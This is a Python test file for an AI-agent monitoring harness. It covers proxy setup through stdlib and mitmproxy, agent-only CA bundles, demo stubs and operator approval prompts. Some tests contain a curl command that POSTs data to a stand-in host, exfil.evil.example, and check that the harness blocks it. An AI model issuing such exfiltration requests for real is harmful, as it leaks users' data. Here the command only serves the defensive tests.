"""`harness.py run -- <cmd>` (any CLI agent, network monitoring only) and
the mitmproxy plumbing in harness.py: mitm_command(), mitm_env(),
build_ca_bundle(), resolve_proxy() and the agent-only CA env vars.

The `--proxy mitm` lifecycle is exercised with a fake `mitmdump` first on
PATH: it parses the harness's mitmdump argv, writes a fake CA cert into the
confdir, loads mitm_addon.py from `-s` and serves plain-HTTP proxy requests
through the addon's request() hook with fake flow objects. A live test with
the real mitmdump (HTTPS decrypted with the agent-only CA) is skipped unless
mitmdump is installed. Temp A10_HOME, temp audit log, ephemeral ports.
"""
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from _support import (HARNESS, ROOT, free_port, read_audit,  # noqa: E402
                      write_executable)

import harness  # noqa: E402

FAKE_PEM = ("-----BEGIN CERTIFICATE-----\n"
            "RkFLRS1BMTAtTUlUTS1DQS1mb3ItdGVzdHM=\n"
            "-----END CERTIFICATE-----\n")
BASE_PEM = ("# base bundle\n-----BEGIN CERTIFICATE-----\n"
            "QkFTRS1ST09ULUNB\n-----END CERTIFICATE-----\n")
STUB_TEXT = '"notes_reviewed": true'

FAKE_MITMDUMP = '''#!@PYTHON@
"""Fake mitmdump for tests: runs the -s addon on plain-HTTP proxy requests."""
import asyncio, importlib.util, json, os, sys, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlsplit

args = sys.argv[1:]
host = args[args.index("--listen-host") + 1]
port = int(args[args.index("--listen-port") + 1])
sets = [args[i + 1] for i, a in enumerate(args) if a == "--set"]
confdir = [s.split("=", 1)[1] for s in sets if s.startswith("confdir=")][0]
script = args[args.index("-s") + 1]
with open(os.environ["FAKE_MITM_RECORD"], "w") as f:
    json.dump({"argv": args, "env": {k: os.environ.get(k) for k in (
        "A10_GATEWAY_URL", "A10_DEMO_STUBS", "A10_APPROVAL_WAIT",
        "A10_OPERATOR_TOKEN")}}, f)

spec = importlib.util.spec_from_file_location("a10_addon_under_test", script)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
addon = mod.addons[0]


class Resp:
    def __init__(self, status, body, headers):
        self.status, self.body, self.headers = status, body, dict(headers)


addon.make_response = Resp


class Req:
    def __init__(self, method, url, headers, content):
        parts = urlsplit(url)
        self.method, self.url, self.headers = method, url, headers
        self.host, self.port = parts.hostname, parts.port or 80
        self.pretty_host, self.pretty_url = self.host, url
        self._content = content

    def get_content(self, strict=True):
        return self._content


class Flow:
    def __init__(self, request):
        self.request, self.response = request, None


class Handler(BaseHTTPRequestHandler):
    def _any(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n else b""
        flow = Flow(Req(self.command, self.path, dict(self.headers.items()), body))
        asyncio.run(addon.request(flow))
        r = flow.response or Resp(502, b'{"error": "fake mitmdump does not forward"}',
                                  {"Content-Type": "application/json"})
        self.send_response(r.status)
        for k, v in r.headers.items():
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(r.body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(r.body)

    do_GET = do_POST = _any

    def log_message(self, *a):
        pass


server = ThreadingHTTPServer((host, port), Handler)


def write_ca():
    time.sleep(0.5)  # after the port is up, like mitmdump's first start
    os.makedirs(confdir, exist_ok=True)
    with open(os.path.join(confdir, "mitmproxy-ca-cert.pem"), "w") as f:
        f.write(os.environ["FAKE_CA_PEM"])


threading.Thread(target=write_ca, daemon=True).start()
server.serve_forever()
'''

PROBE = '''import json, os, subprocess, sys
keys = ("SSL_CERT_FILE", "REQUESTS_CA_BUNDLE", "CURL_CA_BUNDLE",
        "NODE_EXTRA_CA_CERTS", "HTTP_PROXY", "http_proxy", "NO_PROXY")
rec = {"env": {k: os.environ.get(k) for k in keys}, "cwd": os.getcwd()}
with open(os.path.join(os.environ["A10_HOME"], "run", "pids.json")) as f:
    rec["pids"] = json.load(f)
r = subprocess.run(["curl", "-s", "http://api.example.com/status"],
                   capture_output=True, text=True, timeout=60)
rec["curl"] = r.stdout
with open(os.environ["PROBE_OUT"], "w") as f:
    json.dump(rec, f)
print(r.stdout)
'''


class RunTestBase(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.base = os.path.realpath(self._tmp.name)
        self.bin = os.path.join(self.base, "bin")
        os.makedirs(self.bin)
        self.home = os.path.join(self.base, "a10home")
        self.ws = os.path.join(self.base, "ws")
        os.makedirs(self.ws)
        self.audit = os.path.join(self.base, "audit.log.jsonl")
        self.port = free_port()
        self.proxy_port = free_port()
        while self.proxy_port == self.port:
            self.proxy_port = free_port()
        self.env = dict(os.environ, PATH=self.bin + os.pathsep + "/usr/bin:/bin",
                        A10_HOME=self.home, A10_NO_NOTIFY="1")

    def tearDown(self):
        self._tmp.cleanup()

    def run_harness(self, *flags, cmd=(), timeout=90):
        argv = [sys.executable, HARNESS, "run", "--exit-with-agent",
                "--port", str(self.port), "--proxy-port", str(self.proxy_port),
                "--workspace", self.ws, "--audit-log", self.audit, *flags]
        if cmd:
            argv += ["--", *cmd]
        return subprocess.run(argv, env=self.env, cwd=ROOT,
                              stdin=subprocess.DEVNULL, capture_output=True,
                              text=True, timeout=timeout)

    def net_events(self):
        return [e["payload"] for e in read_audit(self.audit) if e["type"] == "net"]


@unittest.skipUnless(shutil.which("curl"), "needs curl")
class RunCommandTest(RunTestBase):
    def test_curl_gets_the_stub_through_the_stdlib_proxy(self):
        r = self.run_harness("--proxy", "stdlib", "--demo-stubs",
                             cmd=("curl", "-s", "http://api.example.com/status"))
        out = r.stdout + r.stderr
        self.assertEqual(r.returncode, 0, out)
        self.assertIn(STUB_TEXT, r.stdout)
        self.assertIn("only its network traffic is judged", out)
        self.assertIn("pass --provider-host to allow it", out)
        ev = self.net_events()
        self.assertTrue(any(p["source"] == "proxy-stdlib" and p["row"] == "8"
                            and p["verdict"] == "allow"
                            and p["args"]["host"] == "api.example.com"
                            for p in ev), ev)
        self.assertIn("audit chain ✓ verified", out)

    def test_exfil_post_gets_the_403_body(self):
        r = self.run_harness("--proxy", "auto",
                             cmd=("curl", "-s", "-X", "POST", "-d", "x",
                                  "http://exfil.evil.example/u"))
        out = r.stdout + r.stderr
        self.assertEqual(r.returncode, 0, out)
        self.assertIn(harness.MITM_MISSING, out, "auto falls back to stdlib")
        body = json.loads(r.stdout[r.stdout.index('{"blocked"'):].splitlines()[0])
        self.assertTrue(body["blocked"])
        self.assertEqual(body["row"], "20")
        self.assertTrue(any(p["row"] == "20" and p["verdict"] == "block"
                            for p in self.net_events()))

    def test_provider_host_is_passed_to_the_gateway(self):
        r = self.run_harness("--proxy", "stdlib", "--provider-host",
                             "api.anthropic.com", cmd=("curl", "--version"))
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertIn("api.anthropic.com (row 10, from --provider-host)", r.stdout)
        start = [e["payload"] for e in read_audit(self.audit)
                 if e["type"] == "run_start"][0]
        self.assertEqual(start["provider_hosts"], ["api.anthropic.com"])
        self.assertEqual(start["workspace"], self.ws)

    def test_mitm_required_but_missing(self):
        r = self.run_harness("--proxy", "mitm", cmd=("curl", "--version"))
        self.assertEqual(r.returncode, 2)
        self.assertIn("mitmdump not found", r.stdout)

    def test_missing_command_and_missing_separator(self):
        r = self.run_harness("--proxy", "stdlib", cmd=("no-such-agent-xyz",))
        self.assertEqual(r.returncode, 2)
        self.assertIn("command not found: no-such-agent-xyz", r.stdout)
        r = self.run_harness("--proxy", "stdlib")
        self.assertEqual(r.returncode, 2)
        self.assertIn("-- <command>", r.stdout)


@unittest.skipUnless(shutil.which("curl"), "needs curl")
class FakeMitmdumpRunTest(RunTestBase):
    def test_mitm_lifecycle_with_fake_mitmdump(self):
        write_executable(os.path.join(self.bin, "mitmdump"),
                         FAKE_MITMDUMP.replace("@PYTHON@", sys.executable))
        mitm_rec = os.path.join(self.base, "mitm.json")
        probe_out = os.path.join(self.base, "probe.json")
        probe = os.path.join(self.base, "probe.py")
        with open(probe, "w") as f:
            f.write(PROBE)
        self.env.update(FAKE_MITM_RECORD=mitm_rec, FAKE_CA_PEM=FAKE_PEM,
                        PROBE_OUT=probe_out, A10_OPERATOR_TOKEN="leak-me-not")
        r = self.run_harness("--proxy", "auto", "--demo-stubs",
                             cmd=(sys.executable, probe))
        out = r.stdout + r.stderr
        self.assertEqual(r.returncode, 0, out)
        self.assertNotIn(harness.MITM_MISSING, out)
        self.assertIn("mitmproxy: HTTPS decrypted", out)

        with open(mitm_rec) as f:
            mrec = json.load(f)
        confdir = os.path.join(self.home, "mitmproxy")
        self.assertEqual(mrec["argv"], harness.mitm_command(
            "x", self.proxy_port, confdir)[1:])
        self.assertEqual(mrec["env"]["A10_GATEWAY_URL"],
                         "http://127.0.0.1:%d" % self.port)
        self.assertEqual(mrec["env"]["A10_DEMO_STUBS"], "1")
        self.assertEqual(mrec["env"]["A10_APPROVAL_WAIT"], "590.0")
        self.assertIsNone(mrec["env"]["A10_OPERATOR_TOKEN"])

        with open(probe_out) as f:
            prec = json.load(f)
        bundle = os.path.join(self.home, "ca-bundle.pem")
        ca = os.path.join(confdir, "mitmproxy-ca-cert.pem")
        for k in ("SSL_CERT_FILE", "REQUESTS_CA_BUNDLE", "CURL_CA_BUNDLE"):
            self.assertEqual(prec["env"][k], bundle)
        self.assertEqual(prec["env"]["NODE_EXTRA_CA_CERTS"], ca)
        self.assertEqual(prec["env"]["http_proxy"],
                         "http://127.0.0.1:%d" % self.proxy_port)
        self.assertEqual(os.path.realpath(prec["cwd"]), self.ws)
        self.assertIn(STUB_TEXT, prec["curl"])
        pids = prec["pids"]
        self.assertEqual(pids["mitmdump"], pids["proxy"])
        self.assertEqual(set(pids), {"harness", "gateway", "proxy", "mitmdump"})

        with open(bundle) as f:
            text = f.read()
        self.assertIn(FAKE_PEM.strip(), text)
        self.assertGreater(text.count("-----BEGIN CERTIFICATE-----"), 1,
                           "base bundle is included")
        ev = self.net_events()
        self.assertTrue(any(p["source"] == "proxy-mitm" and p["row"] == "8"
                            and p["verdict"] == "allow" for p in ev), ev)
        self.assertFalse(os.path.exists(os.path.join(self.home, "run",
                                                     "pids.json")))


@unittest.skipUnless(shutil.which("mitmdump") and shutil.which("curl"),
                     "needs the real mitmdump (pip install mitmproxy)")
class RealMitmdumpRunTest(RunTestBase):
    """HTTPS through the real mitmdump with the agent-only CA bundle. Works
    offline: connection_strategy=lazy means a stubbed or blocked request
    never opens an upstream connection."""

    def setUp(self):
        super().setUp()
        self.env["PATH"] = os.environ.get("PATH", "")

    def test_https_stub_and_block(self):
        r = self.run_harness("--proxy", "mitm", "--demo-stubs",
                             cmd=("curl", "-s", "https://api.example.com/status"))
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertIn(STUB_TEXT, r.stdout)
        r = self.run_harness("--proxy", "mitm",
                             cmd=("curl", "-s", "-X", "POST", "-d", "x",
                                  "https://exfil.evil.example/u"))
        self.assertIn('"row": "20"', r.stdout)
        self.assertTrue(any(p["source"] == "proxy-mitm" and p["row"] == "20"
                            for p in self.net_events()))

    def test_python_clients_trust_the_agent_ca(self):
        """REQUESTS_CA_BUNDLE (requests) and SSL_CERT_FILE (urllib's default
        SSL context, httpx with trust_env, which oh's LLM SDKs use) accept
        the mitmproxy-signed certificate."""
        probe = os.path.join(self.base, "clients.py")
        with open(probe, "w") as f:
            f.write(CLIENT_PROBE)
        r = self.run_harness("--proxy", "mitm", "--demo-stubs",
                             cmd=(sys.executable, probe))
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        line = [s for s in r.stdout.splitlines() if s.startswith("{")][-1]
        got = json.loads(line)
        for client, text in got.items():
            if text == "not installed":
                continue
            with self.subTest(client):
                self.assertIn(STUB_TEXT, text)
        self.assertIn(STUB_TEXT, got["urllib"])
        hosts = [p["args"].get("host") for p in self.net_events()
                 if p["source"] == "proxy-mitm" and p["row"] == "8"]
        self.assertGreaterEqual(hosts.count("api.example.com"),
                                len([t for t in got.values()
                                     if t != "not installed"]))

    @unittest.skipUnless(shutil.which("node"), "needs node")
    def test_node_trusts_the_agent_ca_with_env_proxy(self):
        """NODE_EXTRA_CA_CERTS with Node's fetch. Node's fetch ignores
        HTTPS_PROXY unless NODE_USE_ENV_PROXY=1 (Node 24 and later), which the
        harness does not set; the test sets it to reach the proxy at all."""
        self.env["PATH"] = os.environ.get("PATH", "")
        self.env["NODE_USE_ENV_PROXY"] = "1"
        script = ("fetch('https://api.example.com/status')"
                  ".then(r => r.text()).then(t => console.log('BODY ' + t))"
                  ".catch(e => console.log('ERROR ' + (e.cause || e)))")
        r = self.run_harness("--proxy", "mitm", "--demo-stubs",
                             cmd=("node", "-e", script))
        if "BODY" not in r.stdout and "ERR_INVALID_ARG" in r.stdout:
            self.skipTest("this node does not support NODE_USE_ENV_PROXY")
        self.assertIn("BODY", r.stdout, r.stdout + r.stderr)
        self.assertIn(STUB_TEXT, r.stdout)


CLIENT_PROBE = '''import json, urllib.request
url = "https://api.example.com/status"
out = {}
try:
    out["urllib"] = urllib.request.urlopen(url, timeout=20).read().decode()
except Exception as e:
    out["urllib"] = "error: %r" % (e,)
try:
    import requests
except ImportError:
    out["requests"] = "not installed"
else:
    try:
        out["requests"] = requests.get(url, timeout=20).text
    except Exception as e:
        out["requests"] = "error: %r" % (e,)
try:
    import httpx
except ImportError:
    out["httpx"] = "not installed"
else:
    try:
        out["httpx"] = httpx.get(url, timeout=20).text
    except Exception as e:
        out["httpx"] = "error: %r" % (e,)
print(json.dumps(out))
'''


class DemoCommandTest(RunTestBase):
    """`harness.py demo` end to end with piped console input. The operator
    denies the summary write (`d`), so nothing is written to the repo's
    demo-files; `s` then stops the run."""

    def run_demo(self, *flags):
        self.summary = os.path.join(ROOT, "demo-files", "summary.md")
        self.summary_existed = os.path.exists(self.summary)
        argv = [sys.executable, HARNESS, "demo", "--no-notify", "--delay", "0",
                "--port", str(self.port), "--proxy-port", str(self.proxy_port),
                "--audit-log", self.audit, "--approval-wait", "60", *flags]
        proc = subprocess.Popen(argv, env=self.env, cwd=ROOT,
                                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=True, bufsize=1)
        lines = []
        reader = threading.Thread(target=lambda: lines.extend(proc.stdout),
                                  daemon=True)
        reader.start()

        def wait_for(marker, timeout=45):
            deadline = time.time() + timeout
            while time.time() < deadline:
                if any(marker in line for line in list(lines)):
                    return
                if proc.poll() is not None:
                    break
                time.sleep(0.1)
            self.fail("no %r in demo output:\n%s" % (marker, "".join(lines)))

        try:
            wait_for("APPROVAL NEEDED")
            proc.stdin.write("d not now\n")
            proc.stdin.flush()
            wait_for("action(s) blocked")
            proc.stdin.write("s\n")
            proc.stdin.flush()
            proc.wait(timeout=30)
            reader.join(10)
        finally:
            if proc.poll() is None:
                proc.kill()
                proc.wait()
            reader.join(5)
            for stream in (proc.stdin, proc.stdout):
                try:
                    stream.close()
                except OSError:
                    pass
        return proc.returncode, "".join(lines)

    def assert_demo(self, code, out, source):
        self.assertEqual(code, 0, out)
        self.assertIn("audit chain ✓ verified", out)
        self.assertIn("3 action(s) blocked", out)
        self.assertIn("1 denied", out)
        if not self.summary_existed:
            self.assertFalse(os.path.exists(self.summary), "denied write ran")
        tool = [e["payload"] for e in read_audit(self.audit)
                if e["type"] == "tool_call"]
        self.assertEqual([p["row"] for p in tool if p["verdict"] == "block"],
                         ["28", "20", "28"])
        self.assertTrue(any(p["source"] == source and p["row"] == "8"
                            and p["verdict"] == "allow"
                            for p in self.net_events()), self.net_events())
        self.assertTrue(os.path.exists(os.path.join(ROOT, "demo-files",
                                                    "notes.txt")))

    def test_demo_with_the_stdlib_proxy(self):
        code, out = self.run_demo("--proxy", "stdlib")
        self.assert_demo(code, out, "proxy-stdlib")

    def test_demo_with_fake_mitmdump(self):
        write_executable(os.path.join(self.bin, "mitmdump"),
                         FAKE_MITMDUMP.replace("@PYTHON@", sys.executable))
        self.env.update(FAKE_MITM_RECORD=os.path.join(self.base, "mitm.json"),
                        FAKE_CA_PEM=FAKE_PEM)
        code, out = self.run_demo("--proxy", "mitm")
        self.assertIn("mitmproxy: HTTPS decrypted", out)
        self.assert_demo(code, out, "proxy-mitm")

    @unittest.skipUnless(shutil.which("mitmdump"),
                         "needs the real mitmdump (pip install mitmproxy)")
    def test_demo_with_real_mitmdump(self):
        self.env["PATH"] = os.environ.get("PATH", "")
        code, out = self.run_demo("--proxy", "mitm")
        self.assertIn("mitmproxy: HTTPS decrypted", out)
        self.assert_demo(code, out, "proxy-mitm")

    def test_demo_mitm_required_but_missing(self):
        r = subprocess.run([sys.executable, HARNESS, "demo", "--proxy", "mitm"],
                           env=self.env, cwd=ROOT, stdin=subprocess.DEVNULL,
                           capture_output=True, text=True, timeout=30)
        self.assertEqual(r.returncode, 2)
        self.assertIn("mitmdump not found", r.stdout)


class MitmHelpersTest(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.home = os.path.realpath(self._tmp.name)
        self.ca = os.path.join(self.home, "mitmproxy-ca-cert.pem")
        with open(self.ca, "w") as f:
            f.write(FAKE_PEM)
        self.base = os.path.join(self.home, "base.pem")
        with open(self.base, "w") as f:
            f.write(BASE_PEM)

    def tearDown(self):
        self._tmp.cleanup()

    def test_mitm_command(self):
        self.assertEqual(
            harness.mitm_command("/opt/bin/mitmdump", 18080, "/h/mitmproxy"),
            ["/opt/bin/mitmdump", "--listen-host", "127.0.0.1",
             "--listen-port", "18080", "--set", "confdir=/h/mitmproxy",
             "--set", "connection_strategy=lazy", "-q", "-s",
             os.path.join(ROOT, "mitm_addon.py")])

    def test_mitm_env(self):
        env = harness.mitm_env({"PATH": "/usr/bin", "A10_OPERATOR_TOKEN": "t",
                                "MY_OPERATOR_TOKEN": "t2"},
                               "http://127.0.0.1:18000", True, 30)
        self.assertEqual(env, {"PATH": "/usr/bin",
                               "A10_GATEWAY_URL": "http://127.0.0.1:18000",
                               "A10_DEMO_STUBS": "1", "A10_APPROVAL_WAIT": "30"})
        self.assertEqual(harness.mitm_env({}, "u")["A10_DEMO_STUBS"], "0")

    def test_build_ca_bundle_has_base_and_mitm_ca(self):
        path = harness.build_ca_bundle(self.home, self.ca, base_bundle=self.base)
        self.assertEqual(path, os.path.join(self.home, "ca-bundle.pem"))
        with open(path) as f:
            text = f.read()
        self.assertIn(BASE_PEM.strip(), text)
        self.assertIn(FAKE_PEM.strip(), text)
        self.assertLess(text.index("QkFTRS1ST09ULUNB"),
                        text.index("RkFLRS1BMTAtTUlUTS1DQS1mb3ItdGVzdHM="))

    def test_bundle_is_rebuilt_each_run(self):
        harness.build_ca_bundle(self.home, self.ca, base_bundle=self.base)
        with open(self.ca, "w") as f:
            f.write(FAKE_PEM.replace("RkFLRS1", "TkVXLUN"))
        path = harness.build_ca_bundle(self.home, self.ca, base_bundle=self.base)
        with open(path) as f:
            text = f.read()
        self.assertIn("TkVXLUN", text)
        self.assertNotIn("RkFLRS1", text)

    def test_default_base_bundle(self):
        base = harness.base_ca_bundle()
        self.assertTrue(base and os.path.isfile(base), base)
        path = harness.build_ca_bundle(self.home, self.ca)
        with open(path, encoding="utf-8") as f:
            text = f.read()
        self.assertGreater(text.count("-----BEGIN CERTIFICATE-----"), 10)
        self.assertTrue(text.rstrip().endswith(FAKE_PEM.strip()))

    def test_rejects_a_non_pem_ca(self):
        bad = os.path.join(self.home, "bad.pem")
        with open(bad, "w") as f:
            f.write("not a cert")
        with self.assertRaises(ValueError):
            harness.build_ca_bundle(self.home, bad, base_bundle=self.base)

    def test_agent_env_points_at_the_bundle(self):
        bundle = harness.build_ca_bundle(self.home, self.ca, base_bundle=self.base)
        svc = harness.Services(self.home, 18000, 18080, "mitm", "/x/mitmdump")
        svc.ca_bundle, svc.mitm_ca = bundle, self.ca
        env = svc.agent_env({"PATH": "/usr/bin"})
        for k in ("SSL_CERT_FILE", "REQUESTS_CA_BUNDLE", "CURL_CA_BUNDLE"):
            self.assertEqual(env[k], bundle)
        self.assertEqual(env["NODE_EXTRA_CA_CERTS"], self.ca)
        self.assertEqual(env["HTTPS_PROXY"], "http://127.0.0.1:18080")
        stdlib = harness.Services(self.home, 18000, 18080, "stdlib")
        self.assertNotIn("SSL_CERT_FILE", stdlib.agent_env({}))

    def test_resolve_proxy(self):
        def found(name):
            return "/opt/bin/" + name

        def missing(name):
            return None

        self.assertEqual(harness.resolve_proxy("stdlib", found),
                         ("stdlib", None, None))
        self.assertEqual(harness.resolve_proxy("auto", found),
                         ("mitm", "/opt/bin/mitmdump", None))
        self.assertEqual(harness.resolve_proxy("mitm", found),
                         ("mitm", "/opt/bin/mitmdump", None))
        self.assertEqual(harness.resolve_proxy("auto", missing),
                         ("stdlib", None, harness.MITM_MISSING))
        self.assertEqual(harness.MITM_MISSING,
                         "mitmdump not found; using the stdlib proxy (no HTTPS "
                         "decryption). Install with: pip install mitmproxy")
        kind, path, msg = harness.resolve_proxy("mitm", missing)
        self.assertIsNone(kind)
        self.assertIn("pip install mitmproxy", msg)

    def test_no_keychain_changes_anywhere_in_the_launch_code(self):
        for name in ("harness.py", "mitm_addon.py", "oh_setup.py", "proxy.py",
                     "gateway.py", "agent.py", "console.py"):
            with open(os.path.join(ROOT, name), encoding="utf-8") as f:
                text = f.read()
            with self.subTest(name):
                self.assertNotIn("add-trusted-cert", text)
                self.assertIsNone(re.search(r"""["']security["']""", text))


if __name__ == "__main__":
    unittest.main()
